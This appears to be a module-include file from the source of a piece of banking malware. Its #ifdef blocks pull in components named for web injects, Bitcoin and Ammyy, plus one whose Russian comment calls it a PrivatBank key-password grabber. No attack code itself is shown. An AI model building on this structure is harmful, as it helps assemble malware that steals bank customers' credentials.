

//************************************************************************
//
//  Файл автоматического включения/отключения подключаемых модулей
//
//************************************************************************

#include "Modules.h"
//************************************************************************


#ifdef RafaH  /* модуль Rafa.h */
	#include "Rafa.cpp"
#endif


// Грабер пароля ключа приватбанка
#ifdef PrivatBankH /* модуль PrivatBank.h */
	#include "PrivatBank.cpp"
#endif



#ifdef HTMLInjectLogH
	#include "HTMLInjectLog.cpp"
#endif

#ifdef BitcoinH
	#include "bitcoin.cpp"
#endif

#ifdef AmmyyH
	#include "ammyy.cpp"
#endif
